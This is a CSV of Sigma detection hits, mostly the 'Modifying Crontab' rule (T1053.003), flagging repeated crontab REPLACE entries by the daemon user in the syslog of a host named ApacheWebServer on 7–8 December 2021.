rule,severity,level,table,count,first_utc,last_utc,timestamp_utc,mitre,matched_row,description,rule_id,rule_file
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:07,T1053.003,timestamp_utc=2021-12-08 10:02:07; timestamp=Dec  8 10:02:07; host=ApacheWebServer; process=crontab; pid=12238; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=534,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:07,T1053.003,timestamp_utc=2021-12-08 10:02:07; timestamp=Dec  8 10:02:07; host=ApacheWebServer; process=crontab; pid=12242; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=536,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:08,T1053.003,timestamp_utc=2021-12-08 10:02:08; timestamp=Dec  8 10:02:08; host=ApacheWebServer; process=crontab; pid=12246; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=538,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:08,T1053.003,timestamp_utc=2021-12-08 10:02:08; timestamp=Dec  8 10:02:08; host=ApacheWebServer; process=crontab; pid=12250; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=540,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:08,T1053.003,timestamp_utc=2021-12-08 10:02:08; timestamp=Dec  8 10:02:08; host=ApacheWebServer; process=crontab; pid=12259; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=542,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:08,T1053.003,timestamp_utc=2021-12-08 10:02:08; timestamp=Dec  8 10:02:08; host=ApacheWebServer; process=crontab; pid=12265; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=544,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:09,T1053.003,timestamp_utc=2021-12-08 10:02:09; timestamp=Dec  8 10:02:09; host=ApacheWebServer; process=crontab; pid=12272; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=546,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:09,T1053.003,timestamp_utc=2021-12-08 10:02:09; timestamp=Dec  8 10:02:09; host=ApacheWebServer; process=crontab; pid=12279; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=548,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:09,T1053.003,timestamp_utc=2021-12-08 10:02:09; timestamp=Dec  8 10:02:09; host=ApacheWebServer; process=crontab; pid=12283; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=550,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:09,T1053.003,timestamp_utc=2021-12-08 10:02:09; timestamp=Dec  8 10:02:09; host=ApacheWebServer; process=crontab; pid=12286; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=552,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:10,T1053.003,timestamp_utc=2021-12-08 10:02:10; timestamp=Dec  8 10:02:10; host=ApacheWebServer; process=crontab; pid=12290; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=554,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:10,T1053.003,timestamp_utc=2021-12-08 10:02:10; timestamp=Dec  8 10:02:10; host=ApacheWebServer; process=crontab; pid=12303; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=556,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:10,T1053.003,timestamp_utc=2021-12-08 10:02:10; timestamp=Dec  8 10:02:10; host=ApacheWebServer; process=crontab; pid=12308; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=558,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:10,T1053.003,timestamp_utc=2021-12-08 10:02:10; timestamp=Dec  8 10:02:10; host=ApacheWebServer; process=crontab; pid=12314; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=560,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:11,T1053.003,timestamp_utc=2021-12-08 10:02:11; timestamp=Dec  8 10:02:11; host=ApacheWebServer; process=crontab; pid=12321; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=562,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:11,T1053.003,timestamp_utc=2021-12-08 10:02:11; timestamp=Dec  8 10:02:11; host=ApacheWebServer; process=crontab; pid=12327; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=564,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:11,T1053.003,timestamp_utc=2021-12-08 10:02:11; timestamp=Dec  8 10:02:11; host=ApacheWebServer; process=crontab; pid=12332; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=566,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:11,T1053.003,timestamp_utc=2021-12-08 10:02:11; timestamp=Dec  8 10:02:11; host=ApacheWebServer; process=crontab; pid=12335; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=568,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:11,T1053.003,timestamp_utc=2021-12-08 10:02:11; timestamp=Dec  8 10:02:11; host=ApacheWebServer; process=crontab; pid=12338; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=570,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:12,T1053.003,timestamp_utc=2021-12-08 10:02:12; timestamp=Dec  8 10:02:12; host=ApacheWebServer; process=crontab; pid=12341; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=572,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:13,T1053.003,timestamp_utc=2021-12-08 10:02:13; timestamp=Dec  8 10:02:13; host=ApacheWebServer; process=crontab; pid=12366; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=574,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:13,T1053.003,timestamp_utc=2021-12-08 10:02:13; timestamp=Dec  8 10:02:13; host=ApacheWebServer; process=crontab; pid=12372; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=576,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:13,T1053.003,timestamp_utc=2021-12-08 10:02:13; timestamp=Dec  8 10:02:13; host=ApacheWebServer; process=crontab; pid=12378; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=578,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:13,T1053.003,timestamp_utc=2021-12-08 10:02:13; timestamp=Dec  8 10:02:13; host=ApacheWebServer; process=crontab; pid=12387; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=580,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:14,T1053.003,timestamp_utc=2021-12-08 10:02:14; timestamp=Dec  8 10:02:14; host=ApacheWebServer; process=crontab; pid=12392; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=582,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:14,T1053.003,timestamp_utc=2021-12-08 10:02:14; timestamp=Dec  8 10:02:14; host=ApacheWebServer; process=crontab; pid=12396; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=584,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:14,T1053.003,timestamp_utc=2021-12-08 10:02:14; timestamp=Dec  8 10:02:14; host=ApacheWebServer; process=crontab; pid=12399; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=586,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:14,T1053.003,timestamp_utc=2021-12-08 10:02:14; timestamp=Dec  8 10:02:14; host=ApacheWebServer; process=crontab; pid=12404; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=588,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:15,T1053.003,timestamp_utc=2021-12-08 10:02:15; timestamp=Dec  8 10:02:15; host=ApacheWebServer; process=crontab; pid=12416; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=590,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:15,T1053.003,timestamp_utc=2021-12-08 10:02:15; timestamp=Dec  8 10:02:15; host=ApacheWebServer; process=crontab; pid=12425; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=592,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:15,T1053.003,timestamp_utc=2021-12-08 10:02:15; timestamp=Dec  8 10:02:15; host=ApacheWebServer; process=crontab; pid=12432; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=594,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:15,T1053.003,timestamp_utc=2021-12-08 10:02:15; timestamp=Dec  8 10:02:15; host=ApacheWebServer; process=crontab; pid=12436; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=596,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:15,T1053.003,timestamp_utc=2021-12-08 10:02:15; timestamp=Dec  8 10:02:15; host=ApacheWebServer; process=crontab; pid=12439; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=598,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:16,T1053.003,timestamp_utc=2021-12-08 10:02:16; timestamp=Dec  8 10:02:16; host=ApacheWebServer; process=crontab; pid=12443; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=600,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:16,T1053.003,timestamp_utc=2021-12-08 10:02:16; timestamp=Dec  8 10:02:16; host=ApacheWebServer; process=crontab; pid=12449; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=602,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:16,T1053.003,timestamp_utc=2021-12-08 10:02:16; timestamp=Dec  8 10:02:16; host=ApacheWebServer; process=crontab; pid=12455; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=604,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:16,T1053.003,timestamp_utc=2021-12-08 10:02:16; timestamp=Dec  8 10:02:16; host=ApacheWebServer; process=crontab; pid=12464; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=606,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:17,T1053.003,timestamp_utc=2021-12-08 10:02:17; timestamp=Dec  8 10:02:17; host=ApacheWebServer; process=crontab; pid=12470; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=608,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:17,T1053.003,timestamp_utc=2021-12-08 10:02:17; timestamp=Dec  8 10:02:17; host=ApacheWebServer; process=crontab; pid=12475; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=610,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:17,T1053.003,timestamp_utc=2021-12-08 10:02:17; timestamp=Dec  8 10:02:17; host=ApacheWebServer; process=crontab; pid=12478; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=612,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:17,T1053.003,timestamp_utc=2021-12-08 10:02:17; timestamp=Dec  8 10:02:17; host=ApacheWebServer; process=crontab; pid=12481; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=614,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:18,T1053.003,timestamp_utc=2021-12-08 10:02:18; timestamp=Dec  8 10:02:18; host=ApacheWebServer; process=crontab; pid=12484; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=616,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:18,T1053.003,timestamp_utc=2021-12-08 10:02:18; timestamp=Dec  8 10:02:18; host=ApacheWebServer; process=crontab; pid=12492; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=618,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
